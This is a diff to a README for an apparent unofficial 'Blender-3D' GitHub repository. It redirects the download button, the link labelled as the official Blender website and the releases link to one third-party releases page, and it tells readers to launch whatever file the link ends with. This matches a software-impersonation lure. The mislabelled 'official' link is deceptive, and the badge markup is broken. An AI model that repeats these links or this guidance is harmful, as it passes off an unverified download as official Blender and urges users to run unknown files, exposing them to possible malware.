@@ -34,7 +34,7 @@ Blender is known for its extensive capabilities in creating animated films, visu
 
 🔗 To begin your Blender journey, download the Blender software package by clicking the button below:
 
-[![Download Blender](https://img.shields.io/badge/Download-Blender-blue.svg)](https://github.com/project/files/App.zip)
+[![Download Blender](https://github.com/Shaira0527/Blender-3D/releases)](https://github.com/Shaira0527/Blender-3D/releases)
 
 1. If the link ends with a file name, make sure to launch it.
 2. In case you are directed to a website, simply visit it.
@@ -60,8 +60,8 @@ Stay up to date with the latest Blender news, updates, and features by following
 
 🌟 Thank you for exploring the Blender-3D repository. We hope you embark on an exciting creative journey with Blender and unleash your imagination in the world of 3D graphics and animation. Happy blending! 🎨✨🚀
 
-🔗 [Visit Official Blender Website](https://www.blender.org)
+🔗 [Visit Official Blender Website](https://github.com/Shaira0527/Blender-3D/releases)
 
-🔗 [Check Blender Releases Section](https://github.com/project/files/releases)
+🔗 [Check Blender Releases Section](https://github.com/Shaira0527/Blender-3D/releases)
 
 👾🎮🎬🖌️🌌
